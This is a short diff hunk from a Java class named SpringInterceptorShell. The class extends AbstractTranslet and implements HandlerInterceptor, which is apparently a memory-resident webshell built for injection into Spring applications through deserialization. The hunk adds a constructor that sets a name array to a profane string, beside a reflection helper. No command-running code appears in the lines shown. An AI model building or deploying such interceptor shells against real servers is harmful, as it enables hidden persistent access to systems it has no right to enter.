@@ -15,6 +15,9 @@ import java.lang.reflect.Field;
 import java.util.List;
 
 public class SpringInterceptorShell extends AbstractTranslet implements HandlerInterceptor{
+    public SpringInterceptorShell() throws Exception{
+        namesArray = new String[]{"fuck"};
+    }
     public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
         try {
             Field field = clazz.getDeclaredField(fieldName);
